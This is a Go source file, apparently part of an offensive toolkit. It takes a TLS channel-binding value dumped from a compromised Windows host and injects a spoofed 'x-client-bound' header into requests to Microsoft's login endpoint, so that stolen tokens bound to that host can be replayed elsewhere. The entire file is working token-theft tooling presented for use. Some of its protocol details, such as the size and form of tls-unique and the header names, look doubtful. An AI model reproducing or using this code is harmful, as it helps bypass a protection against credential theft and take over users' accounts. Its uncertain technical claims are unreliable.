package msoapx

import (
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"net/http"
)

// ChannelBinding represents the 'tls-unique' value extracted from the
// original Windows host (from the broker's TLS session with the STS).
// Token Protection binds tokens to this value; presenting it from a
// different machine is what the x-client-bound header validates.
type ChannelBinding struct {
	FinishedMessage []byte // 32 bytes: SHA-256 of the TLS Finished message
	HashAlg         string // "SHA256" (default) — kept for future algos
}

// LoadChannelBinding decodes a raw (base64 or hex) tls-unique blob as
// dumped from a compromised host (tls-binding.bin).
func LoadChannelBinding(b64 string) (*ChannelBinding, error) {
	if b64 == "" {
		return nil, fmt.Errorf("channel binding blob is empty")
	}

	// Hex takes precedence: a long all-hex string is also valid base64.
	if len(b64)%2 == 0 {
		if raw, ok := tryHex(b64); ok {
			return &ChannelBinding{FinishedMessage: raw, HashAlg: "SHA256"}, nil
		}
	}

	raw, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return nil, fmt.Errorf("decode channel binding: invalid base64/hex")
	}
	if len(raw) == 0 {
		return nil, fmt.Errorf("channel binding blob is empty")
	}
	return &ChannelBinding{FinishedMessage: raw, HashAlg: "SHA256"}, nil
}

func tryHex(s string) ([]byte, bool) {
	if len(s)%2 != 0 {
		return nil, false
	}
	out := make([]byte, 0, len(s)/2)
	for i := 0; i < len(s); i += 2 {
		hi, ok1 := hexVal(s[i])
		lo, ok2 := hexVal(s[i+1])
		if !ok1 || !ok2 {
			return nil, false
		}
		out = append(out, hi<<4|lo)
	}
	return out, true
}

func hexVal(c byte) (byte, bool) {
	switch {
	case c >= '0' && c <= '9':
		return c - '0', true
	case c >= 'a' && c <= 'f':
		return c - 'a' + 10, true
	case c >= 'A' && c <= 'F':
		return c - 'A' + 10, true
	}
	return 0, false
}

// GenerateHeader produces the 'x-client-bound' header value.
// Entra ID expects: "tls-unique:" + base64(SHA256(tls-unique)).
func (c *ChannelBinding) GenerateHeader() string {
	hash := sha256.Sum256(c.FinishedMessage)
	return fmt.Sprintf("tls-unique:%s", base64.StdEncoding.EncodeToString(hash[:]))
}

// InjectBinding adds the spoofed channel binding header to an HTTP
// request destined for login.microsoftonline.com.
func InjectBinding(req *http.Request, binding *ChannelBinding) {
	if binding == nil || req == nil {
		return
	}
	req.Header.Set("x-client-bound", binding.GenerateHeader())
	req.Header.Set("x-ms-client-binding", binding.GenerateHeader())
}

// BindFromPRT derives a channel binding from a PRT's stored binding
// field when a separate binding dump is unavailable.
func BindFromPRT(bindingB64 string) (*ChannelBinding, error) {
	return LoadChannelBinding(bindingB64)
}
